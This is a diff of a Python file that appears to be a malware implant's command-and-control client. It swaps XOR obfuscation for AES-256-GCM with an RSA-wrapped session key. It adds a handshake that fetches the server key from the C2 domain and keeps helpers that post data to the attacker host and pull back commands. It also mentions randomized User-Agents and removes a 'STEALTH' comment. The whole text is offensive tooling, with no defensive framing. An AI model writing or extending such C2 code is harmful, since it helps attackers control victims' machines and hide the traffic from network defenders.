@@ -44,25 +44,48 @@ current_dir = os.getcwd()
 client_id = None  # Set after registration
 
 
-def xor_encrypt(data: str) -> str:
-    """XOR encrypt/decrypt a string and return base64 encoded result"""
-    encrypted = bytes([b ^ XOR_KEY for b in data.encode('utf-8', errors='replace')])
-    return base64.b64encode(encrypted).decode()
+# === AES-256 + RSA Hybrid Encryption ===
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP, AES
+from Crypto.Random import get_random_bytes
+
+aes_session_key = get_random_bytes(32)  # 256-bit AES key
+server_rsa_pub_key = None
+
+def fetch_server_rsa_pub():
+    """Fetch server RSA public key during startup handshake"""
+    global server_rsa_pub_key
+    try:
+        resp = requests.get(f"{C2_DOMAIN}rsa_pub", timeout=10)
+        if resp.status_code == 200 and resp.text.strip():
+            server_rsa_pub_key = RSA.import_key(resp.text)
+            return True
+    except Exception:
+        pass
+    return False
+
+def encrypt_aes(data: str) -> str:
+    """Encrypt string with AES-256-GCM"""
+    cipher = AES.new(aes_session_key, AES.MODE_GCM)
+    ciphertext, tag = cipher.encrypt_and_digest(data.encode('utf-8'))
+    payload = cipher.nonce + tag + ciphertext
+    return base64.b64encode(payload).decode()
+
+def decrypt_aes(raw_b64: str) -> str:
+    """Decrypt base64 encoded AES-256-GCM payload"""
+    raw = base64.b64decode(raw_b64)
+    nonce = raw[:16]
+    tag = raw[16:32]
+    ciphertext = raw[32:]
+    cipher = AES.new(aes_session_key, AES.MODE_GCM, nonce=nonce)
+    decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+    return decrypted.decode('utf-8')
 
 
-def xor_decrypt(data: str) -> str:
-    """Decode base64 and XOR decrypt back to string"""
-    raw = base64.b64decode(data)
-    decrypted = bytes([b ^ XOR_KEY for b in raw])
-    return decrypted.decode('utf-8', errors='replace')
-
-
-# === STEALTH: Encrypted C2 Communication Helpers ===
+# === Encrypted C2 Communication Helpers ===
 _http_session = None
 
-
 def get_session():
-    """Get or create an HTTP session with a randomized User-Agent"""
     global _http_session
     if _http_session is None:
         _http_session = requests.Session()
@@ -74,10 +97,33 @@ def get_session():
         })
     return _http_session
 
-
 def c2_post(endpoint, data, timeout=10):
-    """Send XOR-encrypted POST to C2 server"""
-    encrypted = xor_encrypt(json.dumps(data))
+    """Send AES-encrypted POST (with RSA-encrypted session key for registration or direct AES for subsequent requests)"""
+    global server_rsa_pub_key
+    json_data = json.dumps(data)
+    
+    if endpoint == "register":
+        if not server_rsa_pub_key:
+            fetch_server_rsa_pub()
+        
+        if server_rsa_pub_key:
+            rsa_cipher = PKCS1_OAEP.new(server_rsa_pub_key)
+            enc_session_key = base64.b64encode(rsa_cipher.encrypt(aes_session_key)).decode()
+            encrypted_payload = encrypt_aes(json_data)
+            
+            hybrid_packet = {
+                "encrypted_session_key": enc_session_key,
+                "payload": encrypted_payload
+            }
+            return get_session().post(
+                f"{C2_DOMAIN}{endpoint}",
+                data=json.dumps(hybrid_packet),
+                headers={"Content-Type": "application/json"},
+                timeout=timeout
+            )
+            
+    # Standard AES-encrypted request
+    encrypted = encrypt_aes(json_data)
     return get_session().post(
         f"{C2_DOMAIN}{endpoint}",
         data=encrypted,
@@ -85,16 +131,20 @@ def c2_post(endpoint, data, timeout=10):
         timeout=timeout
     )
 
-
 def c2_get(endpoint, params=None, timeout=10):
-    """Send GET to C2 and decrypt XOR-encrypted response"""
+    """Send GET to C2 and decrypt AES response"""
     resp = get_session().get(f"{C2_DOMAIN}{endpoint}", params=params, timeout=timeout)
     if resp.status_code == 200 and resp.text.strip():
         try:
-            decrypted = xor_decrypt(resp.text)
+            # Try AES decryption first
+            decrypted = decrypt_aes(resp.text)
             return json.loads(decrypted)
         except Exception:
-            return None
+            # Fallback to plain JSON
+            try:
+                return resp.json()
+            except Exception:
+                return None
     return None
 
 
